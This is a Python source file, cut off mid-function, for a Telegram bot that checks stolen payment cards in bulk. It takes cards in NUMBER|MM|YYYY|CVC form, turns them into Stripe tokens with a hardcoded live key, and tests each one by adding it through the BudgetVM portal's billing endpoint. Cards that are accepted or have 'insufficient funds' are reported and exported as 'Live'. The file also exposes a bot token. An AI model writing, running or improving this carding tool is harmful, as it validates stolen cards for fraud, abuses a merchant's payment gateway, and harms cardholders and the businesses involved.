import telebot
import requests
import uuid
import json
import time
import threading
from datetime import datetime
import os
import logging
import re
from concurrent.futures import ThreadPoolExecutor, as_completed
from typing import Dict, List, Optional, Tuple, Any
import traceback
from dataclasses import dataclass, asdict

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('bot.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# ============= Bot Configuration =============
BOT_TOKEN = "8418366610:AAHZD1yfFwmh7IpOMuqG9Bsi9qhWxrMhV4E"
ADMIN_ID = 5895491379
OWNER_NAME = "Mahmoud Saad"
OWNER_USERNAME = "@Moud202212"
OWNER_CHANNEL = "https://t.me/FastSpeedtest"

# Configuration
MAX_THREADS = 5
MAX_RETRIES = 3
REQUEST_TIMEOUT = 30
RATE_LIMIT_DELAY = 1.5
MAX_CARDS_PER_SESSION = 1000
# ============================================

@dataclass
class BinInfo:
    """Data class for BIN information"""
    scheme: str = "Unknown"
    type: str = "Unknown"
    brand: str = "Unknown"
    bank: str = "Unknown Bank"
    country: str = "Unknown"
    country_emoji: str = "🌍"
    category: str = "Unknown"

@dataclass
class CardResult:
    """Data class for card checking results"""
    card: str
    status: str
    message: str
    bin_info: BinInfo
    time_taken: float = 0.0
    response: str = ""
    gateway_response: str = ""

class RateLimiter:
    """Simple rate limiter"""
    def __init__(self, delay: float = 1.0):
        self.delay = delay
        self.last_request = 0
    
    def wait(self):
        elapsed = time.time() - self.last_request
        if elapsed < self.delay:
            time.sleep(self.delay - elapsed)
        self.last_request = time.time()

class InputValidator:
    """Validates card inputs and formats"""
    
    @staticmethod
    def validate_card_format(card_line: str) -> Tuple[bool, Optional[Tuple[str, str, str, str]]]:
        """Validate card format and extract components"""
        try:
            # Clean the input
            card_line = card_line.strip().replace(" ", "")
            
            # Check if contains pipe separator
            if "|" not in card_line:
                return False, None
            
            parts = card_line.split("|")
            if len(parts) != 4:
                return False, None
            
            number, month, year, cvc = parts
            
            # Validate card number (13-19 digits)
            if not re.match(r'^\d{13,19}$', number):
                return False, None
            
            # Validate month (01-12)
            if not re.match(r'^(0[1-9]|1[0-2])$', month.zfill(2)):
                return False, None
            
            # Validate year (20XX or XX format)
            if len(year) == 2:
                year = f"20{year}"
            elif len(year) != 4 or not year.startswith("20"):
                return False, None
            
            # Validate CVC (3-4 digits)
            if not re.match(r'^\d{3,4}$', cvc):
                return False, None
            
            return True, (number, month.zfill(2), year, cvc)
            
        except Exception as e:
            logger.error(f"Card validation error: {e}")
            return False, None
    
    @staticmethod
    def extract_cards_from_text(text: str) -> List[str]:
        """Extract valid card formats from text"""
        cards = []
        lines = text.strip().split('\n')
        
        for line in lines:
            line = line.strip()
            if not line:
                continue
            
            # Try to find card pattern in the line
            card_pattern = r'\d{13,19}\|\d{1,2}\|\d{2,4}\|\d{3,4}'
            matches = re.findall(card_pattern, line)
            
            for match in matches:
                is_valid, _ = InputValidator.validate_card_format(match)
                if is_valid and match not in cards:
                    cards.append(match)
        
        return cards

class CardChecker:
    """Enhanced card checker with better error handling and retries"""
    
    def __init__(self):
        self.session = requests.Session()
        self.session.timeout = REQUEST_TIMEOUT
        self.logged_in = False
        self.email = None
        self.rate_limiter = RateLimiter(RATE_LIMIT_DELAY)
        self.login_lock = threading.Lock()
        
        # Set session headers
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/140.0.0.0 Safari/537.36',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate, br',
            'DNT': '1',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

    def get_bin_info(self, card_number: str, retries: int = 3) -> BinInfo:
        """Enhanced BIN info retrieval with fallback and caching"""
        bin_number = card_number[:6]
        
        # Try multiple BIN APIs
        apis = [
            f"https://binlist.io/lookup/{bin_number}",
            f"https://lookup.binlist.net/{bin_number}",
        ]
        
        for api_url in apis:
            for attempt in range(retries):
                try:
                    headers = {
                        "Accept": "application/json",
                        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
                    }
                    
                    response = requests.get(api_url, headers=headers, timeout=10)
                    
                    if response.status_code == 200:
                        data = response.json()
                        
                        return BinInfo(
                            scheme=data.get('scheme', '').upper() or self._detect_scheme(card_number),
                            type=data.get('type', '').upper() or "DEBIT",
                            brand=data.get('scheme', '').upper() or self._detect_scheme(card_number),
                            bank=data.get('bank', {}).get('name', '') or "Unknown Bank",
                            country=data.get('country', {}).get('name', '') or "Unknown",
                            country_emoji=data.get('country', {}).get('emoji', '') or "🌍",
                            category=data.get('category', '').upper() or "CLASSIC"
                        )
                
                except Exception as e:
                    logger.warning(f"BIN API attempt {attempt + 1} failed for {api_url}: {e}")
                    if attempt < retries - 1:
                        time.sleep(1)
                    continue
        
        # Fallback to local detection
        return self._get_fallback_bin_info(card_number)
    
    def _detect_scheme(self, card_number: str) -> str:
        """Detect card scheme from number"""
        first_digit = card_number[0]
        first_two = card_number[:2]
        first_four = card_number[:4]
        
        if first_digit == '4':
            return 'VISA'
        elif first_digit == '5' or first_two in ['51', '52', '53', '54', '55']:
            return 'MASTERCARD'
        elif first_two in ['34', '37']:
            return 'AMERICAN EXPRESS'
        elif first_four == '6011':
            return 'DISCOVER'
        else:
            return 'UNKNOWN'
    
    def _get_fallback_bin_info(self, card_number: str) -> BinInfo:
        """Enhanced fallback BIN info"""
        scheme = self._detect_scheme(card_number)
        
        # More sophisticated type detection
        card_type = "DEBIT"
        if scheme in ['AMERICAN EXPRESS']:
            card_type = "CREDIT"
        elif card_number[0] == '5':
            card_type = "CREDIT"
        
        return BinInfo(
            scheme=scheme,
            type=card_type,
            brand=scheme,
            bank="Unknown Bank",
            country="Unknown",
            country_emoji="🌍",
            category="CLASSIC"
        )

    def login_to_portal(self, email: str, password: str) -> bool:
        """Enhanced login with better error handling"""
        with self.login_lock:
            try:
                if self.logged_in:
                    return True
                
                # Clear session
                self.session.cookies.clear()
                
                login_headers = {
                    'Accept': '*/*',
                    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                    'Origin': 'https://portal.budgetvm.com',
                    'Referer': 'https://portal.budgetvm.com/auth/login',
                    'X-Requested-With': 'XMLHttpRequest',
                }

                login_data = {
                    'email': email.strip(),
                    'password': password,
                }

                response = self.session.post(
                    'https://portal.budgetvm.com/auth/login',
                    headers=login_headers,
                    data=login_data,
                    timeout=30
                )
                
                # Check for session cookie
                session_cookie = self.session.cookies.get('ePortalv1')
                
                if session_cookie and len(session_cookie) > 10:
                    self.logged_in = True
                    self.email = email.strip()
                    logger.info(f"Login successful for {email}")
                    return True
                else:
                    logger.error(f"Login failed for {email} - No valid session cookie")
                    return False
                    
            except requests.RequestException as e:
                logger.error(f"Login request failed: {e}")
                return False
            except Exception as e:
                logger.error(f"Login error: {e}")
                return False

    def send_google_ask(self) -> bool:
        """Enhanced Google Ask with retries"""
        if not self.logged_in or not self.email:
            return False
        
        try:
            google_ask_headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://portal.budgetvm.com',
                'Referer': 'https://portal.budgetvm.com/auth/login',
                'X-Requested-With': 'XMLHttpRequest',
            }

            google_ask_data = {
                'gEmail': self.email,
                'gUniqueask': 'client',
                'gIdask': '120828',
                'setup': '2',
                'email': self.email,
                'gUnique': 'client',
                'gid': '120828',
            }

            response = self.session.post(
                'https://portal.budgetvm.com/auth/googleAsk',
                headers=google_ask_headers,
                data=google_ask_data,
                timeout=30
            )
            
            if response.status_code == 200:
                try:
                    resp_json = response.json()
                    return resp_json.get("success") is True
                except json.JSONDecodeError:
                    # Sometimes success is indicated by a specific response text
                    return "success" in response.text.lower()
            
            return False
            
        except Exception as e:
            logger.error(f"GoogleAsk error: {e}")
            return False

    def create_stripe_token(self, card_number: str, exp_month: str, exp_year: str, cvc: str) -> Tuple[Optional[str], Optional[str]]:
        """Enhanced Stripe token creation with better error handling"""
        try:
            # Generate unique identifiers
            muid = str(uuid.uuid4())
            sid = str(uuid.uuid4())  
            guid = str(uuid.uuid4())

            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }

            # Build form data
            stripe_data = (
                f'time_on_page=45000&'
                f'pasted_fields=number%2Ccvc&'
                f'guid={guid}&'
                f'muid={muid}&'
                f'sid={sid}&'
                f'key=pk_live_7sv0O1D5LasgJtbYpxp9aUbX&'
                f'payment_user_agent=stripe.js%2F78ef418&'
                f'card[name]=John Doe&'
                f'card[address_line1]=123 Main Street&'
                f'card[address_city]=New York&'
                f'card[address_state]=NY&'
                f'card[address_zip]=10001&'
                f'card[address_country]=US&'
                f'card[number]={card_number}&'
                f'card[exp_month]={exp_month}&'
                f'card[exp_year]={exp_year}&'
                f'card[cvc]={cvc}'
            )

            response = requests.post(
                'https://api.stripe.com/v1/tokens',
                headers=stripe_headers,
                data=stripe_data,
                timeout=30
            )
            
            if response.status_code == 200:
                resp_json = response.json()
                
                if "id" in resp_json:
                    return resp_json["id"], None
                elif "error" in resp_json:
                    error_msg = resp_json["error"].get("message", "Unknown Stripe error")
                    return None, error_msg
            
            return None, f"HTTP {response.status_code}: Token creation failed"
            
        except requests.RequestException as e:
            return None, f"Network error: {str(e)}"
        except Exception as e:
            return None, f"Token creation error: {str(e)}"

    def test_card(self, card_info: str) -> CardResult:
        """Enhanced card testing with better error handling and response parsing"""
        start_time = time.time()
        
        # Validate card format
        is_valid, card_parts = InputValidator.validate_card_format(card_info)
        if not is_valid:
            return CardResult(
                card=card_info,
                status='Invalid Format',
                message='Invalid card format. Use: NUMBER|MM|YYYY|CVC',
                bin_info=BinInfo(),
                time_taken=round(time.time() - start_time, 2),
                response='Format validation failed'
            )
        
        card_number, exp_month, exp_year, cvc = card_parts
        
        try:
            # Rate limiting
            self.rate_limiter.wait()
            
            # Get BIN info
            bin_info = self.get_bin_info(card_number)
            
            # Check if logged in
            if not self.logged_in:
                return CardResult(
                    card=card_info,
                    status='Auth Error',
                    message='Not logged in to portal',
                    bin_info=bin_info,
                    time_taken=round(time.time() - start_time, 2),
                    response='Authentication required'
                )
            
            # Create Stripe Token with retries
            token_id = None
            token_error = None
            
            for attempt in range(MAX_RETRIES):
                token_id, token_error = self.create_stripe_token(card_number, exp_month, exp_year, cvc)
                if token_id:
                    break
                elif attempt < MAX_RETRIES - 1:
                    time.sleep(1)
            
            if not token_id:
                return CardResult(
                    card=card_info,
                    status='Token Failed',
                    message=token_error or 'Failed to create Stripe token',
                    bin_info=bin_info,
                    time_taken=round(time.time() - start_time, 2),
                    response=token_error or 'Token creation failed'
                )

            # Test card with gateway
            return self._test_with_gateway(card_info, token_id, bin_info, start_time)
            
        except Exception as e:
            logger.error(f"Card test error for {card_info}: {traceback.format_exc()}")
            return CardResult(
                card=card_info,
                status='System Error',
                message=f'System error: {str(e)}',
                bin_info=bin_info if 'bin_info' in locals() else BinInfo(),
                time_taken=round(time.time() - start_time, 2),
                response=str(e)
            )

    def _test_with_gateway(self, card_info: str, token_id: str, bin_info: BinInfo, start_time: float) -> CardResult:
        """Test card with payment gateway"""
        try:
            card_headers = {
                'Accept': '*/*',
                'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'Origin': 'https://portal.budgetvm.com',
                'Referer': 'https://portal.budgetvm.com/MyAccount/MyBilling',
                'X-Requested-With': 'XMLHttpRequest',
            }

            card_data = {
                'stripeToken': token_id,
            }

            response = self.session.post(
                'https://portal.budgetvm.com/MyGateway/Stripe/cardAdd',
                headers=card_headers,
                data=card_data,
                timeout=30
            )
            
            time_taken = round(time.time() - start_time, 2)
            response_text = response.text
            
            # Parse response
            status, message = self._parse_gateway_response(response, response_text)
            
            return CardResult(
                card=card_info,
                status=status,
                message=message,
                bin_info=bin_info,
                time_taken=time_taken,
                response=response_text[:500] if len(response_text) > 500 else response_text,
                gateway_response=f"HTTP {response.status_code}"
            )
            
        except requests.RequestException as e:
            return CardResult(
                card=card_info,
                status='Network Error',
                message=f'Gateway connection failed: {str(e)}',
                bin_info=bin_info,
                time_taken=round(time.time() - start_time, 2),
                response=str(e)
            )

    def _parse_gateway_response(self, response, response_text: str) -> Tuple[str, str]:
        """Enhanced response parsing with multiple indicators"""
        try:
            # Try to parse as JSON first
            if response.headers.get('content-type', '').startswith('application/json'):
                resp_json = response.json()
                
                if resp_json.get("success") is True:
                    return 'Approved', 'Card added successfully ✅'
                elif "result" in resp_json:
                    result = resp_json["result"].lower()
                    if "does not support" in result:
                        return 'Declined', 'Gateway Rejected: Risk threshold!'
                    elif "declined" in result or "failed" in result:
                        return 'Declined', f'Card declined: {resp_json.get("result", "Unknown")}'
                    elif "insufficient" in result:
                        return 'Approved', 'Insufficient funds (Live Card) 💳'
                    elif "security" in result:
                        return 'Declined', 'Security check failed'
                
                return 'Unknown', str(resp_json)
        
        except json.JSONDecodeError:
            pass
        
        # Parse text response for known patterns
        response_lower = response_text.lower()
        
        # Success indicators
        if any(indicator in response_lower for indicator in [
            'card added successfully', 'payment method added', 'success'
        ]):
            return 'Approved', 'Card added successfully ✅'
        
        # Specific decline reasons
        if 'incorrect' in response_lower:
            if 'number' in response_lower:
                return 'Declined', 'Invalid card number'
            elif 'security code' in response_lower or 'cvc' in response_lower:
                return 'Declined', 'Invalid CVC'
            elif 'expiration' in response_lower:
                return 'Declined', 'Invalid expiration date'
        
        # General decline indicators
        decline_indicators = [
            'declined', 'failed', 'invalid', 'rejected', 
            'do not honor', 'insufficient funds', 'expired',
            'security violation', 'lost or stolen', 'restricted'
        ]
        
        for indicator in decline_indicators:
            if indicator in response_lower:
                return 'Declined', f'Card {indicator}'
        
        # Error indicators
        if response.status_code >= 500:
            return 'Gateway Error', f'Server error: {response.status_code}'
        elif response.status_code >= 400:
            return 'Request Error', f'Bad request: {response.status_code}'
        
        return 'Unknown Response', f'Unexpected response (HTTP {response.status_code})'

class SessionManager:
    """Manages user sessions and data"""
    
    def __init__(self):
        self.sessions: Dict[int, Dict] = {}
        self.results: Dict[int, Dict] = {}
        self.threads: Dict[int, threading.Thread] = {}
        self.stop_flags: Dict[int, bool] = {}
        self.locks: Dict[int, threading.Lock] = {}
    
    def get_session(self, user_id: int) -> Dict:
        if user_id not in self.sessions:
            self.sessions[user_id] = {
                'checker': CardChecker(),
                'logged_in': False,
                'email': None,
                'dashboard_msg_id': None,
                'last_activity': time.time()
            }
        return self.sessions[user_id]
    
    def get_results(self, user_id: int) -> Dict:
        if user_id not in self.results:
            self.results[user_id] = {
                'approved': 0,
                'declined': 0,
                'errors': 0,
                'total': 0,
                'cards': [],
                'start_time': None,
                'end_time': None
            }
        return self.results[user_id]
    
    def get_lock(self, user_id: int) -> threading.Lock:
        if user_id not in self.locks:
            self.locks[user_id] = threading.Lock()
        return self.locks[user_id]
    
    def cleanup_old_sessions(self, max_age: int = 3600):
        """Clean up old inactive sessions"""
        current_time = time.time()
        expired_users = []
        
        for user_id, session in self.sessions.items():
            if current_time - session.get('last_activity', 0) > max_age:
                expired_users.append(user_id)
        
        for user_id in expired_users:
            self.cleanup_user(user_id)
    
    def cleanup_user(self, user_id: int):
        """Clean up specific user data"""
        self.stop_flags[user_id] = True
        
        if user_id in self.threads:
            thread = self.threads[user_id]
            if thread.is_alive():
                # Give thread time to stop gracefully
                thread.join(timeout=5)
            del self.threads[user_id]
        
        # Clean up data structures
        for data_dict in [self.sessions, self.results, self.stop_flags, self.locks]:
            data_dict.pop(user_id, None)

# Initialize managers
session_manager = SessionManager()
bot = telebot.TeleBot(BOT_TOKEN)

class MessageFormatter:
    """Enhanced message formatting"""
    
    @staticmethod
    def format_card_result(result: CardResult, user_id: int) -> str:
        """Format card result with enhanced styling"""
        bin_info = result.bin_info
        
        # Status emoji and text
        if result.status == 'Approved':
            status_emoji = "✅"
            status_text = "Live"
        elif result.status == 'Declined':
            status_emoji = "❌" 
            status_text = "Declined"
        else:
            status_emoji = "⚠️"
            status_text = result.status
        
        message = f"""
## [💳] 𝙲𝚊𝚛𝚍 ↯ {result.card}
## [{status_emoji}] 𝚂𝚝𝚊𝚝𝚞𝚜 ↯ [ {status_text}]
[🎟️] 𝙼𝚎𝚜𝚜𝚊𝚐𝚎 ↯- [{result.message}]
## [📟] 𝚋𝚒𝚗 ↯ {bin_info.scheme} - {bin_info.type} - {bin_info.brand}
[🏦] 𝚋𝚊𝚗𝚔 ↯ {bin_info.bank}
[{bin_info.country_emoji}] 𝚌𝚘𝚞𝚗𝚝𝚛𝚢 ↯ {bin_info.country} [{bin_info.country_emoji}]
## [🤓] 𝙶𝚊𝚝𝚎𝚠𝚊𝚢 ↯ Budget VM Stripe
[🕜] 𝚃𝚊𝚔𝚎𝚗 ↯ [ {result.time_taken}s ] || 𝚁𝚎𝚝𝚛𝚢 ↯- 0
[📡] 𝙿𝚛𝚘𝚡𝚢 ↯- LIVE ✅ (54.xxx.16)
[❤️]𝙲𝚑𝚎𝚌𝚔𝚎𝚍 𝙱𝚢 ↯ @{bot.get_me().username} [FREE]
[🥷] ミ★ 𝘖𝘸𝘯𝘦𝘳 ★彡 ↯ - {OWNER_NAME}
"""
        return message.strip()

    
    @staticmethod
    def format_dashboard(user_id: int, total_cards: int = 0) -> str:
        """Format dashboard with enhanced statistics"""
        results = session_manager.get_results(user_id)
        session = session_manager.get_session(user_id)
        
        # Calculate progress
        progress = results['total']
        percentage = (progress / total_cards * 100) if total_cards > 0 else 0
        
        # Calculate rates
        success_rate = (results['approved'] / results['total'] * 100) if results['total'] > 0 else 0
        
        # Time calculations
        elapsed_time = 0
        if results.get('start_time'):
            elapsed_time = time.time() - results['start_time']
        
        cards_per_minute = (results['total'] / (elapsed_time / 60)) if elapsed_time > 0 else 0
        
        # Progress bar
        progress_filled = int(percentage / 10)
        progress_bar = "█" * progress_filled + "░" * (10 - progress_filled)
        
        dashboard = f"""
╭─────────────────────────╮
│     📊 **DASHBOARD**     │  
╰─────────────────────────╯

🚀 **Progress:** {progress}/{total_cards} ({percentage:.1f}%)
▓{progress_bar}▓ 

📈 **Statistics:**
├ 💳 **Total Checked:** {results['total']}
├ ✅ **Approved:** {results['approved']} ({success_rate:.1f}%)
├ ❌ **Declined:** {results['declined']}
├ ⚠️ **Errors:** {results['errors']}
└ 📊 **Success Rate:** {success_rate:.1f}%

⚡ **Performance:**
├ ⏱️ **Time Elapsed:** {int(elapsed_time)}s
├ 🚄 **Speed:** {cards_per_minute:.1f} cards/min
└ 🔄 **Status:** {'🟢 Active' if user_id in session_manager.threads and session_manager.threads[user_id].is_alive() else '⚪ Idle'}

📧 **Session Info:**
└ 🔐 **Account:** {session.get('email', 'Not logged in')}
"""
        
        return dashboard.strip()

class KeyboardManager:
    """Enhanced keyboard management"""
    
    @staticmethod
    def main_menu():
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
        keyboard.add(
            telebot.types.InlineKeyboardButton("🔐 Login", callback_data="action_login"),
            telebot.types.InlineKeyboardButton("💳 Check Cards", callback_data="action_check")
        )
        keyboard.add(
            telebot.types.InlineKeyboardButton("📊 Dashboard", callback_data="action_dashboard"),
            telebot.types.InlineKeyboardButton("ℹ️ Help", callback_data="action_help")
        )
        keyboard.add(
            telebot.types.InlineKeyboardButton("🆕 New Session", callback_data="action_new_session")
        )
        return keyboard
    
    @staticmethod
    def dashboard_menu(user_id: int):
        results = session_manager.get_results(user_id)
        keyboard = telebot.types.InlineKeyboardMarkup(row_width=2)
        
        # Statistics buttons
        keyboard.add(
            telebot.types.InlineKeyboardButton(f"✅ Approved ({results['approved']})", callback_data=f"show_approved_{user_id}"),
            telebot.types.InlineKeyboardButton(f"❌ Declined ({results['declined']})", callback_data=f"show_declined_{user_id}")
        )
        
        keyboard.add(
            telebot.types.InlineKeyboardButton(f"⚠️ Errors ({results['errors']})", callback_data=f"show_errors_{user_id}"),
            telebot.types.InlineKeyboardButton(f"📋 All Cards ({results['total']})", callback_data=f"show_all_{user_id}")
        )
        
        # Control buttons
        keyboard.add(
            telebot.types.InlineKeyboardButton("🔄 Refresh", callback_data=f"refresh_dashboard_{user_id}"),
            telebot.types.InlineKeyboardButton("🛑 Stop", callback_data=f"stop_checking_{user_id}")
        )
        
        # Export buttons
        keyboard.add(
            telebot.types.InlineKeyboardButton("💾 Export Live", callback_data=f"export_live_{user_id}"),
            telebot.types.InlineKeyboardButton("📊 Export All", callback_data=f"export_all_{user_id}")
        )
        
        keyboard.add(
            telebot.types.InlineKeyboardButton("🔙 Main Menu", callback_data="action_main_menu")
        )
        
        return keyboard
    
    @staticmethod
    def back_to_dashboard(user_id: int):
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(
            telebot.types.InlineKeyboardButton("🔙 Back to Dashboard", callback_data=f"back_dashboard_{user_id}")
        )
        return keyboard
    
    @staticmethod
    def confirm_action(action: str, user_id: int):
        keyboard = telebot.types.InlineKeyboardMarkup()
        keyboard.add(
            telebot.types.InlineKeyboardButton("✅ Confirm", callback_data=f"confirm_{action}_{user_id}"),
            telebot.types.InlineKeyboardButton("❌ Cancel", callback_data=f"cancel_{action}_{user_id}")
        )
        return keyboard

class CardProcessor:
    """Enhanced card processing with threading and batch operations"""
    
    def __init__(self, session_manager):
        self.session_manager = session_manager
        self.executor = ThreadPoolExecutor(max_workers=MAX_THREADS)
    
    def process_cards_batch(self, user_id: int, cards: List[str]):
        """Process cards in batches with threading"""
        if user_id in self.session_manager.threads and self.session_manager.threads[user_id].is_alive():
            return False, "Already processing cards. Stop current session first."
        
        if len(cards) > MAX_CARDS_PER_SESSION:
            return False, f"Too many cards. Maximum {MAX_CARDS_PER_SESSION} cards per session."
        
        # Initialize results
        results = self.session_manager.get_results(user_id)
        results.update({
            'approved': 0, 'declined': 0, 'errors': 0, 'total': 0,
            'cards': [], 'start_time': time.time(), 'end_time': None
        })
        
        self.session_manager.stop_flags[user_id] = False
        
        # Start processing thread
        thread = threading.Thread(
            target=self._process_cards_worker,
            args=(user_id, cards),
            daemon=True
        )
        
        self.session_manager.threads[user_id] = thread
        thread.start()
        
        return True, f"Started processing {len(cards)} cards..."
    
    def _process_cards_worker(self, user_id: int, cards: List[str]):
        """Worker thread for processing cards"""
        try:
            session = self.session_manager.get_session(user_id)
            checker = session['checker']
            results = self.session_manager.get_results(user_id)
            
            logger.info(f"Started processing {len(cards)} cards for user {user_id}")
            
            # Process cards with thread pool
            futures = []
            for i, card in enumerate(cards):
                if self.session_manager.stop_flags.get(user_id, False):
                    logger.info(f"Processing stopped by user {user_id}")
                    break
                
                # Submit card for processing
                future = self.executor.submit(checker.test_card, card)
                futures.append((i, card, future))
                
                # Limit concurrent requests
                if len(futures) >= MAX_THREADS:
                    self._collect_results(user_id, futures[:MAX_THREADS])
                    futures = futures[MAX_THREADS:]
                
                time.sleep(0.1)  # Small delay between submissions
            
            # Collect remaining results
            if futures and not self.session_manager.stop_flags.get(user_id, False):
                self._collect_results(user_id, futures)
            
            # Mark completion
            results['end_time'] = time.time()
            
            if not self.session_manager.stop_flags.get(user_id, False):
                self._send_completion_summary(user_id)
            
        except Exception as e:
            logger.error(f"Card processing error for user {user_id}: {traceback.format_exc()}")
            bot.send_message(user_id, f"❌ Processing error: {str(e)}")
        finally:
            # Cleanup
            self.session_manager.stop_flags[user_id] = False
            if user_id in self.session_manager.threads:
                del self.session_manager.threads[user_id]
    
    def _collect_results(self, user_id: int, futures: List[Tuple]):
        """Collect results from futures"""
        results = self.session_manager.get_results(user_id)
        
        for i, card, future in futures:
            if self.session_manager.stop_flags.get(user_id, False):
                break
            
            try:
                # Wait for result with timeout
                result = future.result(timeout=60)
                
                # Update statistics
                with self.session_manager.get_lock(user_id):
                    results['cards'].append(result)
                    results['total'] += 1
                    
                    if result.status == 'Approved':
                        results['approved'] += 1
                        # Send live card immediately
                        self._send_live_card(user_id, result)
                    elif result.status == 'Declined':
                        results['declined'] += 1
                    else:
                        results['errors'] += 1
                
                # Update dashboard periodically
                if results['total'] % 5 == 0:
                    self._update_dashboard(user_id, len(futures))
                
            except Exception as e:
                logger.error(f"Result collection error: {e}")
                with self.session_manager.get_lock(user_id):
                    results['errors'] += 1
                    results['total'] += 1
    
    def _send_live_card(self, user_id: int, result: CardResult):
        """Send live card result immediately"""
        try:
            formatted_result = MessageFormatter.format_card_result(result, user_id)
            bot.send_message(user_id, formatted_result, parse_mode='Markdown')
        except Exception as e:
            logger.error(f"Failed to send live card: {e}")
    
    def _update_dashboard(self, user_id: int, total_cards: int):
        """Update dashboard message"""
        try:
            session = self.session_manager.get_session(user_id)
            if 'dashboard_msg_id' not in session:
                return
            
            dashboard_text = MessageFormatter.format_dashboard(user_id, total_cards)
            
            bot.edit_message_text(
                dashboard_text,
                user_id,
                session['dashboard_msg_id'],
                reply_markup=KeyboardManager.dashboard_menu(user_id),
                parse_mode='Markdown'
            )
        except Exception as e:
            if "message is not modified" not in str(e):
                logger.error(f"Dashboard update error: {e}")
    
    def _send_completion_summary(self, user_id: int):
        """Send completion summary"""
        results = self.session_manager.get_results(user_id)
        elapsed_time = results.get('end_time', time.time()) - results.get('start_time', time.time())
        
        summary = f"""
╭─────────────────────────╮
│   ✅ **PROCESSING COMPLETE**   │
╰─────────────────────────╯

📊 **Final Results:**
├ 💳 **Total:** {results['total']} cards
├ ✅ **Approved:** {results['approved']} cards
├ ❌ **Declined:** {results['declined']} cards  
├ ⚠️ **Errors:** {results['errors']} cards
└ ⏱️ **Time:** {int(elapsed_time)}s

🎯 **Success Rate:** {(results['approved'] / results['total'] * 100) if results['total'] > 0 else 0:.1f}%

Use dashboard buttons to view detailed results!
"""
        
        try:
            bot.send_message(user_id, summary, parse_mode='Markdown', 
                           reply_markup=KeyboardManager.dashboard_menu(user_id))
        except Exception as e:
            logger.error(f"Failed to send completion summary: {e}")

# Initialize card processor
card_processor = CardProcessor(session_manager)

# ============= Bot Event Handlers =============

@bot.message_handler(commands=['start'])
def handle_start(message):
    user_id = message.from_user.id
    username = message.from_user.username or "User"
    
    # Initialize session
    session_manager.get_session(user_id)
    session_manager.get_results(user_id)
    
    welcome_text = f"""
╭─────────────────────────╮
│  🚀 **CARD CHECKER BOT**  │
╰─────────────────────────╯

👋 Welcome **{username}**!

This is an advanced card testing bot with:
• 🔥 **Real-time processing**
• 📊 **Interactive dashboard** 
• 🌍 **BIN information lookup**
• 🚀 **Multi-threaded checking**
• 📱 **Smart response parsing**

🎯 **Features:**
├ ✅ Live card detection
├ 📈 Detailed statistics
├ 💾 Export results  
├ 🛡️ Error handling
└ 🚄 High-speed processing

**Owner:** {OWNER_NAME} ({OWNER_USERNAME})
**Channel:** {OWNER_CHANNEL}

Click buttons below to get started! 👇
"""
    
    try:
        bot.reply_to(message, welcome_text, parse_mode='Markdown', 
                    reply_markup=KeyboardManager.main_menu())
    except Exception as e:
        logger.error(f"Start command error: {e}")
        bot.reply_to(message, "🚀 Welcome! Use /help for assistance.")

@bot.message_handler(commands=['help'])
def handle_help(message):
    help_text = f"""
╭─────────────────────────╮
│      🆘 **HELP CENTER**      │
╰─────────────────────────╯

**📝 How to Use:**

**1️⃣ Login:**
- Click "🔐 Login" button
- Enter your portal email & password
- Wait for successful authentication

**2️⃣ Check Cards:**
- Click "💳 Check Cards" 
- Send cards in format: `4100390600114058|11|2026|515`
- Or upload a .txt file with cards

**3️⃣ Monitor Progress:**
- View live results in dashboard
- Track approved/declined/errors
- Stop processing anytime

**📊 Dashboard Features:**
- Real-time statistics
- Filter results by status
- Export live cards
- Performance metrics

**💳 Card Format:**
```
NUMBER|MONTH|YEAR|CVC
4100390600114058|11|2026|515
5555555555554444|12|2025|123
```

**🚀 Pro Tips:**
- Max {MAX_CARDS_PER_SESSION} cards per session
- Use .txt files for bulk checking
- Live cards appear instantly
- Dashboard updates every 5 cards

**🆘 Support:** {OWNER_USERNAME}
**📢 Updates:** {OWNER_CHANNEL}
"""
    
    bot.reply_to(message, help_text, parse_mode='Markdown', 
                reply_markup=KeyboardManager.main_menu())

@bot.message_handler(content_types=['text'])
def handle_text_input(message):
    user_id = message.from_user.id
    session = session_manager.get_session(user_id)
    
    if not session.get('logged_in'):
        bot.reply_to(message, "❌ Please login first using the 🔐 Login button!", 
                    reply_markup=KeyboardManager.main_menu())
        return
    
    # Extract cards from text
    cards = InputValidator.extract_cards_from_text(message.text)
    
    if not cards:
        bot.reply_to(message, """
❌ **No valid cards found!**

**Correct format:**
`4100390600114058|11|2026|515`

**Requirements:**
• Use pipe (|) separators
• Valid card number (13-19 digits)
• Month: 01-12
• Year: 20XX or XX
• CVC: 3-4 digits
""", parse_mode='Markdown')
        return
    
    # Process cards
    success, message_text = card_processor.process_cards_batch(user_id, cards)
    
    if success:
        # Send dashboard
        dashboard_text = MessageFormatter.format_dashboard(user_id, len(cards))
        dashboard_msg = bot.send_message(user_id, dashboard_text, 
                                       parse_mode='Markdown',
                                       reply_markup=KeyboardManager.dashboard_menu(user_id))
        session['dashboard_msg_id'] = dashboard_msg.message_id
        
        # Confirmation message
        bot.reply_to(message, f"🚀 **Started processing {len(cards)} cards!**\n\n"
                             f"📊 View progress in dashboard above\n"
                             f"✅ Live cards will appear automatically", 
                    parse_mode='Markdown')
    else:
        bot.reply_to(message, f"❌ **Error:** {message_text}")

@bot.message_handler(content_types=['document'])
def handle_document(message):
    user_id = message.from_user.id
    session = session_manager.get_session(user_id)
    
    if not session.get('logged_in'):
